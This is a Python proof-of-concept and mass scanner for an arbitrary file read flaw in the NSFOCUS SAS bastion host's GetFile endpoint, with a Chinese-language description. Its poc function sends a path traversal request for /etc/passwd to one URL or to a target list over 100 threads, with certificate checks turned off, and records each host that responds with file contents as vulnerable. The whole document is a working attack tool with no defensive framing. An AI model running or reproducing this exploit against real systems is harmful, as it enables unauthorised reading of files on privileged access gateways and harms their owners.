import requests,sys,argparse,os,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """                   _________   __________________     
__________________ ______  /   ___  __/__(_)__  /____ 
__  ___/  _ \  __ `/  __  /    __  /_ __  /__  /_  _ \
_  /   /  __/ /_/ // /_/ /     _  __/ _  / _  / /  __/
/_/    \___/\__,_/ \__,_/______/_/    /_/  /_/  \___/ 
                        _/_____/                      """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='绿盟 SAS堡垒机 GetFile 任意文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd'
    headers = {
        'User-Agent':'Mozilla/4.0(compatible: MSIE 8.0; Windows NT 6.1)',
        'Accept-Encoding':'gzip,deflate',
        'Accept':'*/*',
        'Connection':'close',
        'Accept-Language':'en',
    }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=10)
        if '/bin/bash' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
    except Exception as e:
        print(f'[!]网站异常，请手工测试：{target}')

if __name__ == '__main__':
    main()